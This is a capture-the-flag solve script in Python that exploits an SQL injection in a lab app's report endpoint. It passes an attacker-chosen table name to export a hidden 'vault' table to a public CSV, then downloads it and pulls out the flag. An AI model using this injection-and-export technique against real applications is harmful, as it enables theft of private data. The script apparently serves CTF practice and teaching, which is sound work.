#!/usr/bin/env python3
"""
TransferOps Console (sqli, 500, legendary) — CWE-89 out-of-band *write*.

GET /report?table=<name> writes SELECT * FROM <name> to /reports/<name>.csv,
which the app serves publicly. The table name is attacker-controlled, so we
export the hidden `vault` table and download it.

Usage:
    python3 solve.py                          # defaults to sqli8.chal.deti:8037
    python3 solve.py http://sqli8.chal.deti:8037
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://sqli8.chal.deti:8037"
TABLE = "vault"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    w = requests.get(f"{BASE}/report", params={"table": TABLE}, timeout=10)
    if "written" not in w.text.lower():
        print(f"[-] export failed:\n{w.text[:500]}")
        return 1
    print(f"[+] wrote /reports/{TABLE}.csv")

    csv = requests.get(f"{BASE}/reports/{TABLE}.csv", timeout=10).text
    print(f"[i] csv: {csv.strip()}")
    m = FLAG_RE.search(csv)
    print(f"[+] FLAG: {m.group(0)}" if m else "[-] no flag in csv")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
